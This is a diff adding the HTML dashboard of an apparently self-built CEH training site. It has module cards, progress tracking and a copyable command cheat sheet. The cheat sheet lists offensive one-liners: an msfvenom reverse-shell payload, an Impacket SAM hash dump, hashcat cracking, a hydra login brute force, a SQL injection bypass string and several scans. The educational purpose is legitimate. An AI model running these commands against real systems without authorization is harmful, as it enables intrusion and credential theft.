@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PwnBox Cybersecurity Learning Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=Space+Mono&display=swap"
+        rel="stylesheet">
+    
+    <link rel="stylesheet" href="css/index.css">
+    <script>
+        const savedTheme = localStorage.getItem('theme') || 'light';
+        document.documentElement.setAttribute('data-theme', savedTheme);
+    </script>
+</head>
+
+<body>
+    <!-- Bauhaus Loader -->
+    <div id="bauhaus-loader" class="bauhaus-loader">
+        <div class="loader-box">
+            <div class="loader-block red"></div>
+            <div class="loader-block blue"></div>
+            <div class="loader-block yellow"></div>
+        </div>
+        <div class="loader-text">INITIALIZING...</div>
+    </div>
+    
+    <!-- Custom Reset Confirmation Modal -->
+    <div class="reset-modal-overlay" id="resetModalOverlay">
+        <div class="reset-modal-box">
+            <h3>⚠️ WARNING</h3>
+            <p>Are you sure you want to completely erase all training progress, custom tools, and categories? <strong>This cannot be undone.</strong></p>
+            <div class="reset-modal-actions">
+                <button class="btn-cancel" onclick="closeResetModal()">CANCEL</button>
+                <button class="btn-confirm-reset" onclick="executeResetProgress()">ERASE DATA</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const loader = document.getElementById('bauhaus-loader');
+            document.body.style.overflow = 'hidden';
+            setTimeout(() => {
+                loader.classList.add('hide');
+                document.body.style.overflow = '';
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                }, 800);
+            }, 3000);
+        });
+    </script>
+
+    <header>
+        <div class="logo">
+            <span class="logo-icon">🛡️</span>
+            <span class="logo-text">PwnBox Dashboard</span>
+        </div>
+        <div class="profile-container" style="display: flex; align-items: center; gap: 15px; position: relative;">
+            <button onclick="toggleTheme()" class="theme-nav-btn" style="background: var(--text-main); color: var(--bg-base); border: 2px solid var(--text-main); font-family: 'Space Mono', monospace; font-weight: 700; font-size: 0.75rem; padding: 6px 10px; cursor: pointer; text-transform: uppercase; margin-left: auto;">🌓 Theme</button>
+            <a href="masterguide_ch1.html" style="background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.3); color: #60a5fa; font-weight: 600; font-size: 0.8rem; padding: 7px 15px; border-radius: 6px; cursor: pointer; transition: all 0.2s; text-shadow: 0 0 5px rgba(59,130,246,0.2); text-decoration: none; display: flex; align-items: center; gap: 5px;" onmouseover="this.style.background='rgba(59, 130, 246, 0.2)'" onmouseout="this.style.background='rgba(59, 130, 246, 0.08)'">
+                📚 Master Guide
+            </a>
+            <button onclick="toggleCheatSheetDrawer(event)" style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; font-weight: 600; font-size: 0.8rem; padding: 7px 15px; border-radius: 6px; cursor: pointer; transition: all 0.2s; text-shadow: 0 0 5px rgba(16,185,129,0.2);">
+                📄 Cheat Sheet
+            </button>
+            <div class="user-profile" onclick="toggleProfileDropdown(event)">
+                <div class="user-avatar" id="headerAvatar">?</div>
+                <div class="user-info">
+                    <div id="headerName">UNKNOWN AGENT</div>
+                    <div class="user-rank" id="userRank">Apprentice</div>
+                </div>
+            </div>
+            <div class="profile-dropdown id-card-wrapper" id="profileDropdown">
+                <div class="id-card-inner">
+                    <div class="id-card-front">
+                        <div class="id-card-header">
+                            <div class="barcode">|||||||||||||||</div>
+                            <h4>PWNBOX AGENT ID</h4>
+                        </div>
+                        <div class="id-card-body">
+                            <div class="id-avatar-large" id="largeAvatar">?</div>
+                            <div class="id-details">
+                                <p class="id-label">ALIAS</p>
+                                <h3 id="profileNameDisplay">UNKNOWN AGENT</h3>
+                                <p class="id-label">CLEARANCE</p>
+                                <p class="id-rank" id="dropdownRank">Apprentice</p>
+                            </div>
+                        </div>
+                        <div class="id-card-footer">
+                            <p class="id-label">NEXT OBJECTIVE</p>
+                            <p class="id-next-mission" id="nextMissionText">Complete Recon & Footprinting</p>
+                            <div class="mission-bar-bg"><div class="mission-bar-fill" id="nextMissionProgress"></div></div>
+                        </div>
+                    </div>
+                    <div class="id-card-back">
+                        <div class="id-card-header">
+                            <h4>OPERATIVE SETTINGS</h4>
+                        </div>
+                        <div class="id-card-body settings-body" onclick="event.stopPropagation()">
+                            <label class="id-label">EDIT ALIAS</label>
+                            <input type="text" id="editAliasInput" class="bauhaus-input" placeholder="Enter Alias" value="Pranav">
+                            <label class="id-label">CHOOSE AVATAR</label>
+                            <div class="avatar-selector" id="avatarSelector">
+                                <span onclick="selectAvatar('INITIAL', this)" class="selected" id="initialAvatarChoice">?</span>
+                                <span onclick="selectAvatar('👾', this)">👾</span>
+                                <span onclick="selectAvatar('🕵️', this)">🕵️</span>
+                                <span onclick="selectAvatar('💀', this)">💀</span>
+                            </div>
+                            <button class="btn-save-profile" onclick="saveProfile(event)">SAVE CHANGES</button>
+                        </div>
+                        <div class="id-card-footer">
+                            <button class="btn-reset" onclick="resetAllProgress(event)">⚠️ RESET PROGRESS</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="welcome-panel">
+            <div class="welcome-text">
+                <h1>Welcome Back, Agent</h1>
+                <p>Track your progression in the Certified Ethical Hacker (CEH) curriculum. Complete active modules,
+                    master reconnaissance tools, and unlock higher learning paths.</p>
+            </div>
+            <div class="welcome-progress">
+                <div class="progress-label">Overall Completion</div>
+                <div class="progress-bar-container">
+                    <div class="progress-bar-fill" id="overallProgressBar"></div>
+                </div>
+                <div class="progress-percentage" id="overallProgressText">16%</div>
+            </div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-val" id="completedModulesCount">0 / 6</div>
+                <div class="stat-lbl">Modules Completed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="toolsMasteredCount">22</div>
+                <div class="stat-lbl">Tools Loaded</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="customToolsCount">0</div>
+                <div class="stat-lbl">Custom Tools Added</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="categoriesCount">4</div>
+                <div class="stat-lbl">Active Tool Categories</div>
+            </div>
+        </div>
+
+        <h2 class="section-title">🛡️ Training Curriculum Tracks</h2>
+
+        <div class="modules-grid">
+            <!-- Module 1 -->
+            <div class="module-card active" id="moduleFootprinting">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-active" id="footprintingBadge">Active</span>
+                        <span class="module-num">MODULE 01</span>
+                    </div>
+                    <h3 class="module-title">Footprinting & Reconnaissance</h3>
+                    <p class="module-desc">Gather intelligence on a target system using passive and active OSINT tools,
+                        DNS scrapers, domain trackers, and metadata analysis checkers.</p>
+                </div>
+                <div class="card-bottom">
+                    <span class="module-meta">🌐 22+ Tools Loaded</span>
+                    <a href="Footprinting.html" class="btn-launch">Launch Module ↗</a>
+                </div>
+            </div>
+
+            <!-- Module 2 -->
+            <div class="module-card locked" id="moduleScanning">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-locked" id="scanningBadge">Locked</span>
+                        <span class="module-num">MODULE 02</span>
+                    </div>
+                    <h3 class="module-title">Scanning Networks</h3>
+                    <p class="module-desc">Discover active hosts, open ports, and live service configurations. Practice
+                        banner grabbing and vulnerability identification.</p>
+                </div>
+                <div class="card-bottom" id="scanningActions">
+                    <span class="module-meta">🔒 Pre-req: Module 01</span>
+                    <button class="btn-locked"><span class="lock-icon">🔒</span> Locked</button>
+                </div>
+            </div>
+
+            <!-- Module 3 -->
+            <div class="module-card locked" id="moduleEnumeration">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-locked" id="enumerationBadge">Locked</span>
+                        <span class="module-num">MODULE 03</span>
+                    </div>
+                    <h3 class="module-title">Enumeration & Mapping</h3>
+                    <p class="module-desc">Extract detailed systems details, machine usernames, network shares, routing
+                        paths, and service configurations from target hosts.</p>
+                </div>
+                <div class="card-bottom" id="enumerationActions">
+                    <span class="module-meta">🔒 Pre-req: Module 02</span>
+                    <button class="btn-locked"><span class="lock-icon">🔒</span> Locked</button>
+                </div>
+            </div>
+
+            <!-- Module 4 -->
+            <div class="module-card locked" id="moduleVulnAnalysis">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-locked" id="vulnAnalysisBadge">Locked</span>
+                        <span class="module-num">MODULE 04</span>
+                    </div>
+                    <h3 class="module-title">Vulnerability Analysis</h3>
+                    <p class="module-desc">Perform vulnerability assessments to locate security gaps, analyze exploit
+                        paths, and assess corporate risks using automation.</p>
+                </div>
+                <div class="card-bottom" id="vulnAnalysisActions">
+                    <span class="module-meta">🔒 Pre-req: Module 03</span>
+                    <button class="btn-locked"><span class="lock-icon">🔒</span> Locked</button>
+                </div>
+            </div>
+
+            <!-- Module 5 -->
+            <div class="module-card locked" id="moduleSystemHacking">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-locked" id="systemHackingBadge">Locked</span>
+                        <span class="module-num">MODULE 05</span>
+                    </div>
+                    <h3 class="module-title">System Hacking</h3>
+                    <p class="module-desc">Gain admin control of target environments. Master privilege escalation,
+                        session hijacking, clearing logs, and backdoors.</p>
+                </div>
+                <div class="card-bottom" id="systemHackingActions">
+                    <span class="module-meta">🔒 Pre-req: Module 04</span>
+                    <button class="btn-locked"><span class="lock-icon">🔒</span> Locked</button>
+                </div>
+            </div>
+
+            <!-- Module 6 -->
+            <div class="module-card locked" id="moduleWebApp">
+                <div class="card-top">
+                    <div class="module-badge-row">
+                        <span class="module-badge badge-locked" id="webAppBadge">Locked</span>
+                        <span class="module-num">MODULE 06</span>
+                    </div>
+                    <h3 class="module-title">Web Application Threats</h3>
+                    <p class="module-desc">Examine and exploit OWASP Top 10 vulnerabilities including SQL injection,
+                        cross-site scripting (XSS), and authentication flaws.</p>
+                </div>
+                <div class="card-bottom" id="webAppActions">
+                    <span class="module-meta">🔒 Pre-req: Module 05</span>
+                    <button class="btn-locked"><span class="lock-icon">🔒</span> Locked</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="roadmap-container">
+            <h3 style="font-size: 1.25rem; font-weight: 700; margin-bottom: 5px;">Learning Path Progression Timeline
+            </h3>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">Interactive sequence representing Certified Ethical
+                Hacking methodology.</p>
+            <div class="roadmap-svg-wrapper">
+                <svg style="width: 100%; height: 100%;">
+                    <path d="M 50,60 L 1300,60" class="roadmap-line" id="roadmapBgLine" />
+                    <path d="M 50,60 L 50,60" class="roadmap-line-active" id="roadmapProgressLine" />
+                </svg>
+                <div class="roadmap-nodes">
+                    <div class="node active" id="node1" onclick="window.location.href='Footprinting.html'">
+                        <div class="node-dot"></div>
+                        <div class="node-label">01. Recon</div>
+                    </div>
+                    <div class="node" id="node2">
+                        <div class="node-dot"></div>
+                        <div class="node-label">02. Scan</div>
+                    </div>
+                    <div class="node" id="node3">
+                        <div class="node-dot"></div>
+                        <div class="node-label">03. Enum</div>
+                    </div>
+                    <div class="node" id="node4">
+                        <div class="node-dot"></div>
+                        <div class="node-label">04. Vuln Analysis</div>
+                    </div>
+                    <div class="node" id="node5">
+                        <div class="node-dot"></div>
+                        <div class="node-label">05. Hack</div>
+                    </div>
+                    <div class="node" id="node6">
+                        <div class="node-dot"></div>
+                        <div class="node-label">06. Web Apps</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <span class="logo-icon">🛡️</span> PwnBox Academy
+            </div>
+            <p class="footer-desc">An interactive cyber range and tactical learning environment for mastering the Certified Ethical Hacker methodology.</p>
+            <div class="footer-divider"></div>
+            <div class="footer-bottom">
+                <p class="copyright">© 2026 All Rights Reserved.</p>
+                <div class="watermark">
+                    Designed & Developed by <span class="highlight">Pranav Pushya</span>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    
+    <!-- Drawer Overlay and Cheat Sheet Drawer -->
+    <div class="drawer-overlay" id="drawerOverlay" onclick="toggleCheatSheetDrawer()"></div>
+    <div class="cheat-drawer" id="cheatDrawer">
+        <div class="drawer-header">
+            <h3>📄 CEH Command Cheat Sheet</h3>
+            <button class="drawer-close" onclick="toggleCheatSheetDrawer()">&times;</button>
+        </div>
+        <div class="drawer-body">
+            <!-- Section 1: Footprinting -->
+            <div class="cheat-section">
+                <h4>Module 01: Recon & Footprinting</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Query target domain registration records:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">whois targetcompany.com</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('whois targetcompany.com', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Lookup target DNS record types (A, MX, TXT):</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">nslookup -type=mx targetcompany.com</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('nslookup -type=mx targetcompany.com', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Dump exif geolocation data from image:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">exiftool confidential.jpg</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('exiftool confidential.jpg', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 2: Network Scanning -->
+            <div class="cheat-section">
+                <h4>Module 02: Network Scanning</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Quiet, stealthy TCP SYN port scan:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">nmap -sS -Pn targetip</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('nmap -sS -Pn targetip', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Brute-force discover subdirectories on site:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">gobuster dir -u target.com -w common.txt</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('gobuster dir -u target.com -w common.txt', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Grab service response headers (banner grab):</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">curl -I https://target.com</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('curl -I https://target.com', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 3: Enumeration & Mapping -->
+            <div class="cheat-section">
+                <h4>Module 03: System Enumeration</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Query Windows/Samba system shares & users:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">enum4linux -a 192.168.1.5</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('enum4linux -a 192.168.1.5', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Walk the remote SNMP device management tree:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">snmpwalk -v 2c -c public 192.168.1.10</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('snmpwalk -v 2c -c public 192.168.1.10', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Query Active Directory / LDAP servers:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">ldapsearch -x -H ldap://192.168.1.20</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('ldapsearch -x -H ldap://192.168.1.20', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 4: Vulnerability Analysis -->
+            <div class="cheat-section">
+                <h4>Module 04: Vulnerability Analysis</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Search for known exploits locally:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">searchsploit apache 2.4</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('searchsploit apache 2.4', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Perform vulnerability scan with Nmap:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">nmap -sV --script vuln targetip</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('nmap -sV --script vuln targetip', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Run web server vulnerability scan:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">nikto -h http://target.com</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('nikto -h http://target.com', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 5: System Hacking -->
+            <div class="cheat-section">
+                <h4>Module 05: System Hacking</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Crack password hashes using wordlist:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">hashcat -m 1000 hash.txt rockyou.txt</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('hashcat -m 1000 hash.txt rockyou.txt', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Generate reverse shell payload:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe > shell.exe</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe > shell.exe', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Extract SAM hashes via Impacket:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">secretsdump.py domain/user:pass@targetip</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('secretsdump.py domain/user:pass@targetip', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 6: Web App Threats -->
+            <div class="cheat-section">
+                <h4>Module 06: Web App Threats</h4>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Classic SQLi Authentication Bypass:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">' OR 1=1 --</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('\' OR 1=1 --', this)">📋</button>
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <div class="cheat-desc">Fuzz web directories/files:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">wfuzz -c -z file,wordlist.txt http://target.com/FUZZ</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('wfuzz -c -z file,wordlist.txt http://target.com/FUZZ', this)">📋</button>
+                    </div>
+                </div>
+
+                <div class="cheat-item">
+                    <div class="cheat-desc">Brute force web login form:</div>
+                    <div class="cheat-cmd-box">
+                        <span class="cheat-cmd">hydra -l admin -P pass.txt targetip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</span>
+                        <button class="btn-copy-cmd" onclick="copyCheatCommand('hydra -l admin -P pass.txt targetip http-post-form &quot;/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect&quot;', this)">📋</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="js/index.js"></script>
+    <script src="js/theme.js"></script>
+    </body>
+
+</html>
